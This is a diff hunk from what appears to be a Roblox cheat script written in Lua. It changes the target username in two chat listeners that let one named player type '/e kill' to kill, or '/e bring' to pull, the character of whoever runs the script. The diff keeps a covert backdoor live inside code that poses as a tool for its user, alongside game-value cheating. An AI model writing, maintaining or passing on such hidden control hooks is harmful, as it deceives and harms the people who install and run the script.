@@ -180,13 +180,13 @@ plr.CharacterAdded:Connect(function()
         plr.Backpack.ServerTraits.Stann.Value = 100
     end)
 end)
-game.Players["IcedTearz"].Chatted:connect(function(msg)
+game.Players["IceddTearz"].Chatted:connect(function(msg)
 
     if (string.lower(msg) == "/e kill") then
         game.Players.LocalPlayer.Character:BreakJoints()
     end
 end)
-game.Players["IcedTearz"].Chatted:connect(function(msg)
+game.Players["IceddTearz"].Chatted:connect(function(msg)
 
     if (string.lower(msg) == "/e bring") then
         local tp = Instance.new("RocketPropulsion")
